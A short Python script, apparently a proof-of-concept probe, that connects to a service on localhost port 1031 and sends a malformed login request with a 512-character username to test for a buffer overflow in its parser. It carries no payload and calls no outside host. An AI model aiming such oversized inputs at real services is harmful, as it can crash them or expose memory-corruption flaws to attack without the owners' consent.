import socket

# Config
USER = 'A'*512
SERVER = ('127.0.0.1', 1031)

# Login (dirty hack)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.send(bytes('GETContent-Length:1\n&version=commfunction=login&username='+USER+'&','UTF-8'))
print (repr(s.recv(1024+len(USER))))
s.close()